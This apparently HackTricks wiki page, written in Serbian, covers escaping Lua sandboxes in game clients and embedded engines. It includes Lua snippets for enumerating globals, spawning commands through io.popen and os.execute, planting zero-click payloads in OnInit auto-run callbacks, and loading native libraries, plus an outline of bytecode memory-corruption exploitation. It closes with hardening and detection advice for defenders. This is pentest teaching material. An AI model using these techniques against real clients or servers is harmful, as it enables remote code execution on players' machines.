# Zaobilaženje Lua sandboxes (ugrađeni VM-ovi, game clients)

Ova stranica prikuplja praktične tehnike za nabrajanje i bekstvo iz Lua "sandboxes" ugrađenih u aplikacije (naročito game clients, plugins ili in-app scripting engines). Mnogi engines izlažu ograničeno Lua okruženje, ali ostavljaju dostupne moćne globalne promenljive koje omogućavaju proizvoljno izvršavanje komandi ili čak native memory corruption kada su bytecode loaders izloženi.

Ključne ideje:
- Tretirajte VM kao nepoznato okruženje: nabrojte _G i otkrijte koji su opasni primitives dostupni.
- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC channel kao output sink za posmatranje rezultata.
- Ako je io/os izložen, često imate direktno command execution (io.popen, os.execute).
- Ako su load/loadstring/loadfile izloženi, izvršavanje crafted Lua bytecode-a može ugroziti memory safety u nekim verzijama (≤5.1 verifiers se mogu zaobići; 5.2 je uklonio verifier), čime se omogućava napredna exploitation.

## Nabrajanje sandboxed environment-a

- Izbacite globalno okruženje da biste popisali dostupne tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ako `print()` nije dostupan, preusmerite kanale unutar VM-a. Primer iz VM-a skripte za uređenje prostora u MMO igri, gde izlaz za chat radi samo nakon poziva zvuka; sledeće kreira pouzdanu izlaznu funkciju:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizujte ovaj obrazac za svoju metu: bilo koje polje za tekst, toast, logger ili UI callback koji prihvata stringove može služiti kao stdout za reconnaissance.

## Direktno izvršavanje komandi ako je io/os izložen

Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno imate neposredno izvršavanje komandi:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Napomene:

- Izvršavanje se odvija unutar klijentskog procesa; mnogi anti-cheat/antidebug slojevi koji blokiraju eksterne debuggere neće sprečiti kreiranje procesa unutar VM-a.
- Takođe proverite: package.loadlib (učitavanje proizvoljnih DLL/.so biblioteka), require sa native modulima, LuaJIT-ov ffi (ako je prisutan) i debug biblioteku (može podići privilegije unutar VM-a).

## Zero-click okidači putem auto-run callback funkcija

Ako host aplikacija prosleđuje skripte klijentima, a VM izlaže auto-run hook-ove (npr. OnInit/OnLoad/OnEnter), postavite payload tamo za drive-by compromise čim se skripta učita:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Svaki ekvivalentni callback (OnLoad, OnEnter itd.) uopštava ovu tehniku kada se scripts automatski prenose i izvršavaju na klijentu.

## Opasne primitive koje treba tražiti tokom izviđanja

Tokom enumeracije _G, posebno tražite:
- io, os: io.popen, os.execute, file I/O, pristup env promenljivama.
- load, loadstring, loadfile, dofile: izvršavanje source-a ili bytecode-a; podržava učitavanje nepouzdanog bytecode-a.
- package, package.loadlib, require: učitavanje dynamic library-ja i površina modula.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
- Samo u LuaJIT-u: ffi.cdef, ffi.load za direktno pozivanje native code-a.

Minimalni primeri upotrebe (ako su dostupni):

Lua API za učitavanje promenio se između verzija: u Lua 5.1, `load` čita iz reader funkcije, a `loadstring` čita iz stringa; `load` u Lua 5.2 prihvata ili string ili reader funkciju, dok je `loadstring` zastareo kao njegov ekvivalent.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opciono eskaliranje: zloupotreba Lua bytecode loader-a

Kada su load/loadstring/loadfile dostupni, ali su io/os ograničeni, izvršavanje posebno izrađenog Lua bytecode-a može dovesti do primitive za otkrivanje i korupciju memorije. Ključne činjenice:
- Lua ≤ 5.1 je isporučivan sa bytecode verifier-om koji ima poznate bypass-e.<sup>[[4]](#references)</sup>
- Lua 5.2 je u potpunosti uklonio verifier (zvanični stav: aplikacije bi jednostavno trebalo da odbiju precompiled chunks), čime se povećava attack surface ako učitavanje bytecode-a nije zabranjeno.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows obično podrazumevaju: leak pointers putem in-VM output-a, izradu bytecode-a za kreiranje type confusion-a (npr. oko FORLOOP ili drugih opcode-ova), a zatim prelazak na arbitrary read/write ili native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Ovaj put zavisi od engine-a/verzije i zahteva RE. Pogledajte reference za detaljne analize, exploitation primitives i primere gadgetry-ja u igrama.

## Napomene o detekciji i hardening-u (za defendere)

- Server side: odbacite ili prepišite user scripts; dozvolite samo safe APIs; uklonite ili vežite na prazne vrednosti io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: pokrenite Lua sa minimalnim _ENV, zabranite bytecode loading, ponovo uvedite strict bytecode verifier ili signature checks i blokirajte process creation iz client procesa.
- Telemetry: generišite alert na gameclient → child process creation ubrzo nakon script load-a; korelišite to sa UI/chat/script event-ima.

## References

- [1] [Ova kuća je ukleta: RCE stara čitavu deceniju u AION client-u (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Razlaganje bytecode-a: razotkrivanje Lua security flaws u Factorio-u](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Diskusija o uklanjanju bytecode verifier-a](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist sa verifier bypass-ima/napomenama)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
